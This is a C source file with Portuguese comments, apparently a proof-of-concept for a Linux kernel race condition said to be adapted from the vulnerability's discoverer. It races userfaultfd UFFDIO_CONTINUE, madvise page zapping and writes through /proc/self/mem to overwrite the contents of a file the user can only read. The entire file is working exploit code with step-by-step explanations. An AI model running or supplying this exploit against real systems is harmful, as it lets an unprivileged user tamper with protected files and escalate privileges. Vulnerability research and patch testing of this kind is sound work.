/* 
 * codigo adaptado de David Hildenbrand (pessoa que encontrou a vulnerabilidade)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <poll.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>

int mem_fd;
void *map;
volatile int tmp;
int uffd;

char str[80];

// essa funcao vai ficar fazendo zap da pagina com o madvise e vai tocar na pagina
// para gerar um minor page fault. Isso vai dar trigger no uffd handler que setamos
// na outra funcao e ele vai chamar o UFFDIO_CONTINUE
void *discard_thread_fn(void *arg)
{
	int ret;

	while (1) {
		//printf("[+]zapping page\n");
		ret = madvise(map, 4096, MADV_DONTNEED);
		if (ret < 0) {
			fprintf(stderr, "madvise() failed: %d\n", errno);
			exit(1);
		}
		//printf("[+] triggering UFFDIO_CONTINUE\n");
		tmp += *((int *)map);
	}
}

// essa funcao so vai ficar escrevendo toda hora.
void *write_thread_fn(void *arg)
{
	while (1)
		pwrite(mem_fd, str, strlen(str), (uintptr_t) map);
}

static void *uffd_thread_fn(void *arg)
{
	static struct uffd_msg msg;
	struct uffdio_continue uffdio;
	struct uffdio_range uffdio_wake;
	ssize_t nread;

	while (1) {
		struct pollfd pollfd;
		int nready;

		pollfd.fd = uffd;
		pollfd.events = POLLIN;
		// a thread vai ficar esperando o kernel enviar uma notificacao
		// com um fault para o uffd resolver
		// aqui a thread vai ficar fazendo polling
		// https://www.geeksforgeeks.org/difference-between-interrupt-and-polling/
		nready = poll(&pollfd, 1, -1);
		if (nready == -1) {
			fprintf(stderr, "poll() failed: %d\n", errno);
			exit(1);
		}

		// le a mensagem que chegou do kernel
		nread = read(uffd, &msg, sizeof(msg));
		if (nread <= 0)
			continue;

		uffdio.range.start = (unsigned long) map;
		uffdio.range.len = 4096;
		uffdio.mode = 0;
		// aqui a thread simplesmente vai dizer ao kernel para continuar e resolver
		// o fault ele mesmo
		// isso vai permitir que o path de codigo vulneravel seja seguido
		if (ioctl(uffd, UFFDIO_CONTINUE, &uffdio) < 0) {
			if (errno == EEXIST) {
				uffdio_wake.start = (unsigned long) map;
				uffdio_wake.len = 4096;
				if (ioctl(uffd, UFFDIO_WAKE, &uffdio_wake) < 0) {

				}
			} else {
				fprintf(stderr, "UFFDIO_CONTINUE failed: %d\n", errno);
			}
		}
	}
}


// aqui a gente vai setar o uffd handler. Isso eh uma syscall que vai fazer com que haja um
// monitoramento de uma determinada regiao de memoria do processo.
static int setup_uffd(void)
{
	struct uffdio_api uffdio_api;
	struct uffdio_register uffdio_register;

	// faz a syscall seguindo a ABI do linux e passando as flags necessarias.
	// se nao passarmos a UFFD_USER_MODE_ONLY, provavelmente a syscall vai
	// falhar. Isso porque sem essa flag a syscall pode ser usada para monitorar
	// enderecos do kernel. O kernel vai negar essa syscall por nao sermos
	// um usuario com privilegios
	uffd = syscall(__NR_userfaultfd,
		       O_CLOEXEC | O_NONBLOCK | UFFD_USER_MODE_ONLY);
	if (uffd < 0) {
		fprintf(stderr, "syscall() failed: %d\n", errno);
		return -errno;
	}

	// aqui setamos as ops do uffd. Criamos um monitor para minor
	// page faults em memoria compartilhada
	uffdio_api.api = UFFD_API;
	uffdio_api.features = UFFD_FEATURE_MINOR_SHMEM;
	if (ioctl(uffd, UFFDIO_API, &uffdio_api) < 0) {
		fprintf(stderr, "UFFDIO_API failed: %d\n", errno);
		return -errno;
	}

	if (!(uffdio_api.features & UFFD_FEATURE_MINOR_SHMEM)) {
		fprintf(stderr, "UFFD_FEATURE_MINOR_SHMEM missing\n");
		return -ENOSYS;
	}

	// aqui a gente seta a regiao da memoria que iremos monitorar
	// (nesse caso a regiao do mmap anterior)
	uffdio_register.range.start = (unsigned long) map;
	uffdio_register.range.len = 4096;
	uffdio_register.mode = UFFDIO_REGISTER_MODE_MINOR;
	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) < 0) {
		fprintf(stderr, "UFFDIO_REGISTER failed: %d\n", errno);
		return -errno;
	}

	return 0;
}


// essa funcao so vai printar o arquivo modificado no final
// (codigo do autor mantido)
static void print_content(int fd)
{
	ssize_t ret;
	char buf[80];
	int offs = 0;

	while (1) {
		ret = pread(fd, buf, sizeof(buf) - 1, offs);
		if (ret > 0) {
			buf[ret] = 0;
			printf("%s", buf);
			offs += ret;
		} else if (!ret) {
			break;
		} else {
			fprintf(stderr, "pread() failed: %d\n", errno);
		}
	}
	printf("\n");
}

int main(int argc, char *argv[])
{
	// criamos as threads para fazer a race.
	pthread_t thread1, thread2, thread3, thread4, thread5;
	// criar mais threads nao fez muita diferenca no tempo de exploit
	//pthread_t thread6, thread7;
	struct tm *time_info;
	time_t current_time;
	char tmp[80];
	int fd;

	fd = open(argv[1], O_RDONLY);
	if (fd < 0) {
		fprintf(stderr, "open() failed: %d\n", errno);
		return 1;
	}

	// a gente usa o /proc/self/mem para habilitar a flag de FOLL_FORCE
	printf("[+] opening /proc/self/mem\n");
	mem_fd = open("/proc/self/mem", O_RDWR);
	if (mem_fd < 0) {
		fprintf(stderr, "open(/proc/self/mem) failed: %d\n", errno);
		return 1;
	}

	printf("mmaping\n");
	map = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd ,0);
	if (map == MAP_FAILED) {
		fprintf(stderr, "mmap() failed: %d\n", errno);
		return 1;
	}

	// chama a funcao de setup de antes
	if (setup_uffd())
		return 1;

	/* diminuí o tamanho da string para escrita para que seja mais facil escrever tudo*/
	time(&current_time);
	time_info = localtime(&current_time);
	strftime(str, sizeof(str), "%S", time_info);

	printf("will write %s\n", str);
	printf("Old content: \n");
	print_content(fd);

	// criando mais 2 threads: uma para descartar mais as paginas
	// e outra para fazer mais writes
	// a gente ganha a race bem mais rapido
	printf("!!creating threads!!\n");
	printf("[+] creating thread 1!\n");
	pthread_create(&thread1, NULL, discard_thread_fn, NULL);
	printf("[+] creating thread 2!\n");
	pthread_create(&thread2, NULL, write_thread_fn, NULL);
	printf("[+] creating thread 3!\n");
	pthread_create(&thread3, NULL, uffd_thread_fn, NULL);
	printf("[+] creating thread 4!\n");
	pthread_create(&thread4, NULL, discard_thread_fn, NULL);
	printf("[+] creating thread 5!\n");
	pthread_create(&thread5, NULL, write_thread_fn, NULL);
	//printf("[+] creating thread 6!\n");
	//pthread_create(&thread6, NULL, discard_thread_fn, NULL);
	//printf("[+] creating thread 7!\n");
	//pthread_create(&thread7, NULL, write_thread_fn, NULL);
	printf("[+] all threads created\n");

	/* aqui a gente faz um loop para verificar se o conteudo foi alterado (mantido do autor) */
	printf("entering loop...\n");
	while (1) {
		ssize_t ret = pread(fd, tmp, strlen(str), 0);

		if (ret > 0) {
			tmp[ret] = 0;
			if (!strcmp(tmp, str))
				break;
		}
	}

	printf("New content: \n");
	print_content(fd);

	return 0;
}
